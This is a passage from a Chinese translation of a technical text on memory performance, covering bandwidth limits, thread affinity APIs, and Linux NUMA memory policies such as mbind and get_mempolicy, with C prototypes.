个周期，使用该技巧（或 if-then-else 块）的交叉点非常低。这绝对是一个值得记住的技术。不幸的是，这意味着不能使用 gcc 的 <code>__sync_</code> * 原语。</p><h4 id="6-4-3-带宽考虑"><a href="#6-4-3-带宽考虑" class="headerlink" title="6.4.3 带宽考虑"></a>6.4.3 带宽考虑</h4><p>当使用许多线程时，如果它们不通过在不同核心上使用相同的缓存行来引起缓存争用，仍然存在潜在问题。每个处理器有一个最大带宽到内存，这个带宽由该处理器上的所有核心和超线程共享。根据机器架构（例如，图 2.1 中的一个），多个处理器可能共享通往内存的相同总线或北桥。</p><p>处理器核心本身以频率运行，在满速下，即使在完美条件下，与内存的连接也无法在不等待的情况下满足所有加载和存储请求。现在，将可用带宽除以共享北桥连接的核心、超线程和处理器的数量，突然并行性成为一个大问题。理论上非常高效的程序可能受到内存带宽的限制。</p><p>在图 3.32 中，我们已经看到增加处理器的 FSB 速度可以有很大帮助。这就是为什么，随着处理器上核心数量的增加，我们也将会看到 FSB 速度的增加。然而，如果程序使用大的工作集并且足够优化，这仍然永远不够。程序员必须准备好识别由于带宽限制导致的问题。</p><p>现代处理器的性能测量计数器允许观察 FSB 争用。在 Core 2 处理器上，<code>NUS_BNR_DRV</code> 事件计数核心必须等待的周期数，因为总线未就绪。这表明总线高度使用，从或存储到主内存的加载甚至比平常更长。Core 2 处理器支持更多事件，可以计数特定的总线操作，如 RFO 或总线利用的一般情况。后者在开发期间调查应用程序的可扩展性可能性时可能会很有用。如果总线利用率已经接近 1.0，则可扩展性机会很小。</p><p>如果识别出带宽问题，可以采取几件事情。它们有时是矛盾的，所以可能需要一些实验。一种解决方案是购买更快的计算机，如果有一些可用的话。获得更多的 FSB 速度、更快的 RAM 模块，可能还有靠近处理器的内存，可以——并且很可能会——有所帮助。它可能成本很高。如果问题程序只在一台（或几台机器）上需要，硬件的一次性费用可能比重写程序的成本更低。总的来说，最好还是改进程序。</p><p>在优化程序本身以避免缓存未命中之后，实现更好带宽利用的唯一选项是更好地在可用的核心上放置线程。默认情况下，内核中的调度器将根据其自己的策略将线程分配给处理器。尽可能避免将线程从一个核心移动到另一个核心。调度器实际上对工作负载一无所知。它可以从缓存未命中等收集信息，但这在许多情况下并没有太多帮助。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292020921.png"></p><blockquote><p><strong>图 6.13：低效调度</strong></p></blockquote><p>可以导致大量 FSB 使用的情况之一是，当两个线程被安排在不同的处理器（或核心上，它们不共享缓存）上，并且它们使用相同的数据集时。图 6.13 显示了这种情况。核心 1 和 3 访问相同的数据（通过访问指示器和内存区域的相同颜色表示）。同样，核心 2 和 4 访问相同的数据。但是线程被安排在不同的处理器上。这意味着每个数据集必须从内存中读取两次。这种情况可以更好地处理。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292020177.png"></p><blockquote><p><strong>图 6.14：高效调度</strong></p></blockquote><p>在图 6.14 中，我们看到它应该如何理想地看起来。现在使用的总缓存大小减少了，因为现在核心 1 和 2 以及核心 3 和 4 处理相同的数据。数据集只需从内存中读取一次。</p><p>这是一个简单的例子，但通过扩展，它适用于许多情况。如前所述，内核中的调度器对数据的使用没有任何了解，因此程序员必须确保调度是高效的。没有多少内核接口可用于传达此要求。事实上，只有一个：定义线程亲缘性。</p><p>线程亲缘性意味着将线程分配给一个或多个核心。调度器然后将在这些核心中选择（仅）决定在哪里运行线程。即使其他核心处于空闲状态，它们也不会被考虑。这听起来可能是一个缺点，但这是必须付出的代价。如果太多线程专门在一组核心上运行，剩余的核心可能大部分时间都处于空闲状态，除了改变亲缘性之外，没有什么可以做的。默认情况下，线程可以在任何核心上运行。</p><p>有几种接口可用于查询和更改线程的亲缘性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sched_setaffinity</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">size_t</span> size, <span class="hljs-type">const</span> <span class="hljs-type">cpu_set_t</span> *cpuset)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sched_getaffinity</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">size_t</span> size, <span class="hljs-type">cpu_set_t</span> *cpuset)</span>;<br></code></pre></td></tr></table></figure><p>这两个接口旨在用于单线程代码。<code>pid</code> 参数指定应更改或确定哪个进程的亲缘性。调用者显然需要适当的权限来执行此操作。第二和第三个参数指定核心的位掩码。第一个函数要求位掩码被填充，以便它可以设置亲缘性。第二个函数用所选线程的调度信息填充位掩码。这些接口在 <code> &lt;sched.h&gt;</code> 中声明。</p><p><code>cpu_set_t</code> 类型也在该头文件中定义，以及许多用于操作和使用此类对象的宏。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_SETSIZE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_SET(cpu, cpusetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_CLR(cpu, cpusetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ZERO(cpusetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ISSET(cpu, cpusetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_COUNT(cpusetp)</span><br></code></pre></td></tr></table></figure><p><code>CPU_SETSIZE</code> 指定可以在数据结构中表示的 CPU 数量。其他三个宏操作 <code>cpu_set_t</code> 对象。要初始化对象，应使用 <code>CPU_ZERO</code>；其他两个宏用于选择或取消选择单个核心。<code>CPU_ISSET</code> 测试特定处理器是否是集合的一部分。<code>CPU_COUNT</code> 返回集合中选定的核心数。<code>cpu_set_t</code> 类型为 CPU 数量提供了一个合理的默认值作为上限。随着时间的推移，它肯定会被证明太小；在那时，该类型将被调整。这意味着程序始终要注意大小。上面的便利宏根据 <code>cpu_set_t</code> 的定义隐式处理大小。如果需要更动态的大小处理，则应使用一组扩展的宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_SET_S(cpu, setsize, cpusetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_CLR_S(cpu, setsize, cpusetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ZERO_S(setsize, cpusetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ISSET_S(cpu, setsize, cpusetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_COUNT_S(setsize, cpusetp)</span><br></code></pre></td></tr></table></figure><p>这些接口接受一个额外的参数，大小。为了能够动态分配大小的 CPU 集合，提供了三个宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ALLOC_SIZE(count)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ALLOC(count)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_FREE(cpuset)</span><br></code></pre></td></tr></table></figure><p><code>CPU_ALLOC_SIZE</code> 宏返回必须为 <code>cpu_set_t</code> 结构分配的字节数，该结构可以处理 <code>count</code> 个 CPU。要分配这样一个块，可以使用 <code>CPU_ALLOC</code> 宏。以这种方式分配的内存应使用 <code>CPU_FREE</code> 释放。这些函数可能会在幕后使用 <code>malloc</code> 和 <code>free</code>，但这并不一定非要保持这种方式。</p><p>最后，定义了 CPU 集合对象上的一些操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_EQUAL(cpuset1, cpuset2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_AND(destset, cpuset1, cpuset2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_OR(destset, cpuset1, cpuset2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_XOR(destset, cpuset1, cpuset2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_EQUAL_S(setsize, cpuset1, cpuset2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_AND_S(setsize, destset, cpuset1, cpuset2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_OR_S(setsize, destset, cpuset1, cpuset2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_XOR_S(setsize, destset, cpuset1, cpuset2)</span><br></code></pre></td></tr></table></figure><p>这两组四个宏可以检查两个集合是否相等，并对集合执行逻辑 AND、OR 和 XOR 操作。这些操作在使用一些 libNUMA 函数（见第 12 节）时可能会派上用场。</p><p>进程可以使用 <code>sched_getcpu</code> 接口确定它当前正在哪个处理器上运行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sched_getcpu</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><p>结果是 CPU 集合中的 CPU 索引。由于调度的本质，这个数字并不总是 100 % 正确。线程在返回结果和线程返回用户级之间可能已经被移动到不同的 CPU 上。程序始终必须考虑不准确的可能。更重要的是，无论如何，线程被允许在其上运行的 CPU 集合。这个集合可以通过 <code>sched_getaffinity</code> 检索。集合由子线程和进程继承。线程不能依赖集合在其生命周期内保持稳定。亲缘性掩码可以从外部设置（见上述原型中的 <code>pid</code> 参数）；Linux 还支持 CPU 热插拔，这意味着 CPU 可以从系统中消失——因此，也从亲缘性 CPU 集合中消失。</p><p>在多线程程序中，各个线程官方上没有 POSIX 定义的进程 ID，因此不能使用上述两个函数。相反，<code>&lt;pthread.h&gt;</code> 声明了四个不同的接口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_setaffinity_np</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> th, <span class="hljs-type">size_t</span> size,</span><br><span class="hljs-params">                         <span class="hljs-type">const</span> <span class="hljs-type">cpu_set_t</span> *cpuset)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_getaffinity_np</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> th, <span class="hljs-type">size_t</span> size, <span class="hljs-type">cpu_set_t</span> *cpuset)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_setaffinity_np</span><span class="hljs-params">(<span class="hljs-type">pthread_attr_t</span> *at,</span><br><span class="hljs-params">                               <span class="hljs-type">size_t</span> size, <span class="hljs-type">const</span> <span class="hljs-type">cpu_set_t</span> *cpuset)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_getaffinity_np</span><span class="hljs-params">(<span class="hljs-type">pthread_attr_t</span> *at, <span class="hljs-type">size_t</span> size,</span><br><span class="hljs-params">                                <span class="hljs-type">cpu_set_t</span> *cpuset)</span>;<br></code></pre></td></tr></table></figure><p>前两个接口基本上与我们已经看到的两个接口相同，只是它们在第一个参数中接受线程句柄，而不是进程 ID。这允许在进程中单独解决线程。这也意味着这些接口不能从另一个进程中使用，它们严格用于进程内使用。第三和第四个接口使用线程属性。这些属性用于创建新线程。通过设置属性，可以从一开始就在特定的核心集合上调度线程。在线程实际开始之前选择目标处理器——而不是在线程已经开始之后——在许多不同的层面上可能是有利的，包括（尤其是）内存分配（见第 6.5 节的 NUMA）。</p><p>谈到 NUMA，亲缘性接口在 NUMA 编程中也扮演着重要角色。我们很快就会回到这个案例。</p><p>到目前为止，我们已经讨论了两个线程的工作集重叠的情况，使得让两个线程在同一个核心上有意义。相反的情况也可能是正确的。如果两个线程在不同的数据集上工作，将它们调度在同一个核心上可能会有问题。两个线程争夺同一个缓存，从而减少了彼此对缓存的有效使用。其次，两个数据集都必须加载到同一个缓存中；实际上，这增加了必须加载的数据量，因此可用带宽减半。</p><p>在这种情况下的解决方案是设置线程的亲缘性，使它们不能被调度到同一个核心上。这与前面的情况相反，因此在进行任何更改之前，理解要优化的情况进行很重要。</p><p>为了缓存共享而优化带宽实际上是 NUMA 编程的一个方面，这在下一节中介绍。我们只需要将“内存”的概念扩展到缓存。随着缓存级别的增加，这将变得越来越重要。因此，多核调度的解决方案在 NUMA 支持库中可用。有关如何确定亲缘性掩码而不使用硬编码系统详细信息或深入 <code>/sys</code> 文件系统底层的代码示例，请参见第 12 节。</p><h3 id="6-5-NUMA-编程"><a href="#6-5-NUMA-编程" class="headerlink" title="6.5 NUMA 编程"></a>6.5 NUMA 编程</h3><p>对于 NUMA 编程，到目前为止关于缓存优化的所有内容也都适用。差异仅在该级别以下开始。NUMA 在访问地址空间的不同部分时引入了不同的成本。在统一内存访问中，我们可以优化以最小化页面错误（见第 7.5 节），但就是这样。所有页面都是平等的。</p><p>NUMA 改变了这一点。访问成本可能取决于被访问的页面。不同的访问成本也增加了优化内存页面局部性的重要性。对于大多数 SMP 机器来说，NUMA 是不可避免的，因为 Intel 使用 CSI（对于 x86、x86-64 和 IA-64）和 AMD（对于 Opteron）都采用了它。随着每个处理器上核心数量的增加，我们可能会看到 SMP 系统的使用急剧减少（至少在数据中心和 CPU 使用要求极高的人的办公之外）。大多数家用机器只需要一个处理器，因此没有 NUMA 问题。但这 a) 不意味着程序员可以忽略 NUMA，b) 并不意味着没有相关问题。</p><p>如果一个人思考对 NUMA 的概括，很快就会意识到概念扩展到处理器缓存。使用相同缓存的核心上的两个线程将比不共享缓存的核心上的线程更快地协作。这不是一个虚构的案例：</p><ul><li>早期的双核心处理器没有 L2 共享。</li><li>例如，Intel 的 Core 2 QX 6700 和 QX 6800 四核芯片分别有两个独立的 L2 缓存。</li><li>如早期所推测的，随着芯片上核心数量的增加和统一缓存的愿望，我们将拥有更多级别的缓存。</li></ul><p>缓存形成了它们自己的层次结构，核心上的线程放置对于共享（或不共享）缓存变得重要。这与 NUMA 面临的问题并没有太大不同，因此这两个概念可以统一。因此，即使只对非 SMP 机器感兴趣的人也应该阅读本节。</p><p>在第 5.3 节中，我们已经看到 Linux 内核提供了许多有用且在 NUMA 编程中需要的信息。然而，收集这些信息并不容易。目前 Linux 上可用的 NUMA 库对此目的来说完全不合适。作者目前正在构建一个更合适的版本。</p><p>现有的 NUMA 库 <code>libnuma</code>，是 numactl 包的一部分，不提供对系统架构信息的访问。它只是对可用系统调用的包装，以及一些常用操作的便利接口。Linux 今天可用的系统调用是：</p><ul><li><p><strong><code>mbind</code></strong> 为指定的内存页面选择节点的绑定。</p></li><li><p><strong><code>set_mempolicy</code></strong> 设置默认的内存绑定策略。</p></li><li><p><strong><code>get_mempolicy</code></strong> 获取默认的内存绑定策略。</p></li><li><p><strong><code>migrate_pages</code></strong> 将进程的所有页面从一个给定的节点集迁移到不同的节点集。</p></li><li><p><strong><code>move_pages</code></strong> 将选定的页面移动到给定的节点或请求关于页面的节点信息。</p></li></ul><p>这些接口在 <code> &lt;numaif.h&gt;</code> 中声明，它随 <code>libnuma</code> 库一起提供。在我们深入更多细节之前，我们必须理解内存策略的概念。</p><h4 id="6-5-1-内存策略"><a href="#6-5-1-内存策略" class="headerlink" title="6.5.1 内存策略"></a>6.5.1 内存策略</h4><p>定义内存策略的背后思想是允许现有代码在不需要大量修改的情况下，在 NUMA 环境中合理地工作。策略由子进程继承，这使得使用 numactl 工具成为可能。这个工具可以用来启动一个带有给定策略的程序。</p><p>Linux 内核支持以下策略：</p><p><strong><code>MPOL_BIND</code></strong> 内存仅从给定的节点集分配。如果不可能，则分配失败。</p><p><strong><code>MPOL_PREFERRED</code></strong> 内存最好从给定的节点集分配。如果失败，考虑来自其他节点的内存。</p><p><strong><code>MPOL_INTERLEAVE</code></strong> 内存从指定的节点等量分配。节点是通过 VMA 基于策略的虚拟内存区域的偏移选择的，或者是通过任务基于策略的自由运行计数器选择的。</p><p><strong><code>MPOL_DEFAULT</code></strong> 根据区域的默认值选择分配。</p><p>这个列表似乎是递归定义策略。这是半真的。事实上，内存策略形成了一个层次结构（见图 6.15）。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292021979.png"></p><blockquote><p><strong>图 6.15：内存策略层次结构</strong></p></blockquote><p>如果地址被 VMA 策略覆盖，则使用此策略。共享内存段使用一种特殊类型的策略。如果没有为特定地址指定策略，则使用任务的策略。如果这也不存在，则使用系统的默认策略。</p><p>系统的默认策略是将内存分配给请求内存的线程本地。默认情况下，没有提供任务和 VMA 策略。对于具有多个线程的进程，本地节点是“主”节点，即首先运行进程的节点。上述系统调用可以用来选择不同的策略。</p><h4 id="6-5-2-指定策略"><a href="#6-5-2-指定策略" class="headerlink" title="6.5.2 指定策略"></a>6.5.2 指定策略</h4><p><code>set_mempolicy</code> 调用可以用来设置当前线程（内核术语中的任务）的任务策略。只有当前线程受到影响，而不是整个进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;numaif.h&gt;</span></span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">set_mempolicy</span><span class="hljs-params">(<span class="hljs-type">int</span> mode,</span><br><span class="hljs-params">                    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *nodemask,</span><br><span class="hljs-params">                    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> maxnode)</span>;<br></code></pre></td></tr></table></figure><p><code>mode</code> 参数必须是上一节中介绍的 <code>MPOL_*</code> 常量之一。<code>nodemask</code> 参数指定要使用的内存节点，<code>maxnode</code> 是 <code>nodemask</code> 中的节点数（即位数）。如果使用 <code>MPOL_DEFAULT</code>，则忽略 <code>nodemask</code> 参数。如果 <code>nodemask</code> 为 <code>MPOL_PREFERRED</code> 的空指针，则选择本地节点。否则，<code>MPOL_PREFERRED</code> 使用 <code>nodemask</code> 中相应位设置的最低节点号。</p><p>设置策略不会影响已经分配的内存。页面不会自动迁移；只有未来的分配受到影响。请注意内存分配和地址空间保留之间的区别：使用 <code>mmap</code> 建立的地址空间区域通常不是自动分配的。对内存区域的第一次读写操作将分配适当的页面。如果策略在访问同一地址空间区域的不同页面之间发生变化，或者如果策略允许从不同的节点分配内存，那么一个看似统一的地址空间区域可能会分散在许多内存节点上。</p><h4 id="6-5-3-交换和策略"><a href="#6-5-3-交换和策略" class="headerlink" title="6.5.3 交换和策略"></a>6.5.3 交换和策略</h4><p>如果物理内存耗尽，系统必须丢弃干净页面并保存脏页面到交换空间。Linux 交换实现在将页面写入交换空间时丢弃节点信息。这意味着当页面被重用并且页面被分页时，将从头选择使用的节点。这种变化的关联意味着程序不能将节点关联存储为页面的属性。关联可以随着时间的推移而改变。对于与其他进程共享的页面，这种情况也可能发生，因为进程可能要求它（见下面的 <code>mbind</code> 讨论）。内核本身可以在一个节点空间不足而其他节点仍然有空闲空间时迁移页面。</p><p>因此，用户级代码了解到的任何节点关联只能在短时间内是正确的。它更像是一个提示，而不是绝对信息。每当需要准确知识时，都应该使用 <code>get_mempolicy</code> 接口（见第 6.5.5 节）。</p><h4 id="6-5-4-VMA-策略"><a href="#6-5-4-VMA-策略" class="headerlink" title="6.5.4 VMA 策略"></a>6.5.4 VMA 策略</h4><p>要为地址范围设置 VMA 策略，必须使用不同的接口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;numaif.h&gt;</span></span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">mbind</span><span class="hljs-params">(<span class="hljs-type">void</span> *start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len,</span><br><span class="hljs-params">            <span class="hljs-type">int</span> mode, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *nodemask,</span><br><span class="hljs-params">            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> maxnode, <span class="hljs-type">unsigned</span> flags)</span>;<br></code></pre></td></tr></table></figure><p>这个接口为地址范围 <code>[ start, start + len)</code> 注册了一个新的 VMA 策略。由于内存处理操作在页面上进行，因此起始地址必须与页面对齐。<code>len</code> 值会向上舍入到下一页大小。</p><p><code>mode</code> 参数再次指定策略；值必须从第 6.5.1 节中的列表中选择。与 <code>set_mempolicy</code> 一样，<code>nodemask</code> 参数仅在某些策略中使用。它的处理是相同的。</p><p><code>mbind</code> 接口的语义取决于 <code>flags</code> 参数的值。默认情况下，如果 <code>flags</code> 为零，系统调用为地址范围设置 VMA 策略。现有的映射不受影响。如果这还不够，目前有三个标志可以修改这种行为；它们可以单独或一起选择：</p><ul><li><strong><code>MPOL_MF_STRICT</code></strong></li></ul><p>如果 <code>nodemask</code> 未指定的所有页面都在 <code>mbind</code> 的 <code>start</code> 和 <code>len</code> 参数描述的地址范围内，则调用 <code>mbind</code> 将失败。如果将此标志与 <code>MPOL_MF_MOVE</code> 和&#x2F;或 <code>MPOL_MF_MOVEALL</code> 一起使用，并且任何页面无法移动，则调用将失败。</p><ul><li><strong><code>MPOL_MF_MOVE</code></strong></li></ul><p>内核将尝试移动在 <code>nodemask</code> 未指定的节点上分配的地址范围内的任何页面。默认情况下，只有当前进程的页表单独使用的页面才会被移动。</p><ul><li><strong><code>MPOL_MF_MOVEALL</code></strong></li></ul><p>像 <code>MPOL_MF_MOVE</code>，但内核将尝试移动所有页面，而不仅仅是当前进程的页表单独使用的页面。这有系统级的影响，因为它会影响其他进程（可能是不同用户拥有的）的内存访问。因此，<code>MPOL_MF_MOVEALL</code> 是一个需要特权的操作（需要 <code>CAP_NICE</code> 能力）。</p><p><br><br><br>请注意，对 <code>MPOL_MF_MOVE</code> 和 <code>MPOL_MF_MOVEALL</code> 的支持仅在 Linux 内核的 2.6.16 版本中添加。</p><p>不带任何标志调用 <code>mbind</code> 在需要在实际分配任何页面之前为新保留的地址范围指定策略时最有用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *p = mmap(<span class="hljs-literal">NULL</span>, len, PROT_READ|PROT_WRITE, MAP_ANON, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (p != MAP_FAILED)<br>  mbind(p, len, mode, nodemask, maxnode, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>这段代码序列保留了 <code>len</code> 字节的地址空间范围，并指定应该使用引用 <code>nodemask</code> 中内存节点的 <code>mode</code> 策略。除非与 <code>mmap</code> 一起使用 <code>MAP_POPULATE</code> 标志，否则在 <code>mbind</code> 调用时不会有内存被分配，因此新策略适用于该地址空间区域的所有页面。</p><p><code>MPOL_MF_STRICT</code> 标志单独使用可以用来确定 <code>mbind</code> 的 <code>start</code> 和 <code>len</code> 参数描述的地址范围内的任何页面是否分配在 <code>nodemask</code> 指定的节点之外。未更改任何已分配的页面。如果所有页面都在指定节点上分配，则根据 <code>mode</code> 更改地址空间区域的 VMA 策略。</p><p>有时可能需要重新平衡内存，这种情况下可能需要将一个节点上分配的页面移动到另一个节点。将 <code>MPOL_MF_MOVE</code> 设置为 <code>mbind</code> 的调用将尽力实现这一目标。只有进程的页表树单独引用的页面才被考虑移动。可能有多个用户以线程或其他进程的形式共享该部分页表树。不可能影响其他进程，因为它们恰好映射了相同的数据。这些页面不共享页表条目。</p><p>如果将 <code>MPOL_MF_STRICT</code> 和 <code>MPOL_MF_MOVE</code> 都传递给 <code>mbind</code>，则内核将尝试移动所有未在指定节点上分配的页面。如果不可能，调用将失败。这样的调用可能有助于确定是否有一个节点（或节点集）可以容纳所有页面。可以连续尝试几种组合，直到找到合适的节点。</p><p>使用 <code>MPOL_MF_MOVEALL</code> 更难以辩解，除非运行当前进程是计算机的主要目的。原因是即使是出现在多个页表中的页面也会被移动。这很容易对其他进程产生负面影响。因此，应谨慎使用此操作。</p><h4 id="6-5-5-查询节点信息"><a href="#6-5-5-查询节点信息" class="headerlink" title="6.5.5 查询节点信息"></a>6.5.5 查询节点信息</h4><p><code>get_mempolicy</code> 接口可以用来查询有关给定地址的 NUMA 状态的多种信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;numaif.h&gt;</span></span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">get_mempolicy</span><span class="hljs-params">(<span class="hljs-type">int</span> *policy,</span><br><span class="hljs-params">                    <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *nmask,</span><br><span class="hljs-params">                    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> maxnode,</span><br><span class="hljs-params">                    <span class="hljs-type">void</span> *addr, <span class="hljs-type">int</span> flags)</span>;<br></code></pre></td></tr></table></figure><p>当 <code>get_mempolicy</code> 被调用时，在 <code>flags</code> 中没有设置标志，有关地址 <code>addr</code> 的策略的信息存储在指向 <code>policy</code> 的指针指向的字中，以及指向 <code>nmask</code> 的指针指向的节点位掩码中。如果 <code>addr</code> 落在已指定 VMA 策略的地址空间区域中，则返回有关该策略的信息。否则，返回有关任务策略或必要时系统默认策略的信息。</p><p>如果 <code>flags</code> 中设置了 <code>MPOL_F_NODE</code> 标志，并且管理 <code>addr</code> 的策略是 <code>MPOL_INTERLEAVE</code>，则存储在指向 <code>policy</code> 的指针指向的字中的值是下一次分配将要发生的节点的索引。这些信息可能用于设置将要使用新分配内存的线程的亲缘性。这可能是实现接近性的一种成本较低的方式，特别是如果线程尚未创建。</p><p><code>MPOL_F_ADDR</code> 标志可用于检索另一种完全不同的数据项。如果使用此标志，则存储在指向 <code>policy</code> 的指针指向的字中的值是已为包含 <code>addr</code> 的页面分配内存的内存节点的索引。这些信息可用于决策可能的页面迁移，决定哪个线程可以最有效地工作在内存位置，等等。</p><p>CPU（因此内存节点）是线程使用的比其内存分配更易变。除非有明确的请求，否则内存页面只有在极端情况下才会移动。程序可以查看当前的 CPU 和节点信息；只是必须避免假设关联不会改变。</p><p>libNUMA 提供了两个接口，用于查询给定虚拟地址空间范围的节点信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 